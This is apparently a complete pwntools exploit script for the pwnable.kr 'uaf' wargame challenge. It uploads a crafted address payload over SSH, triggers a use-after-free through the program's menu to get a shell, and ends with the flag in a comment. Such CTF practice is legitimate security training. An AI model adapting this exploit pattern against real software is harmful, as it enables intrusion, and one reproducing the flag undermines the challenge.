from pwn import *

argv = ["/home/uaf/uaf", "8", "/tmp/pwnfile"]
con = ssh("uaf", "pwnable.kr", 2222, "guest")
con.upload_data(p64(0x401568), "/tmp/pwnfile")
sh = con.process(argv)
sh.recvuntil("3. free")
sh.sendline("3")
sh.recvuntil("3. free")
sh.sendline("2")
sh.recvuntil("3. free")
sh.sendline("2")
sh.recvuntil("3. free")
sh.sendline("1")
sh.interactive()

# yay_f1ag_aft3r_pwning
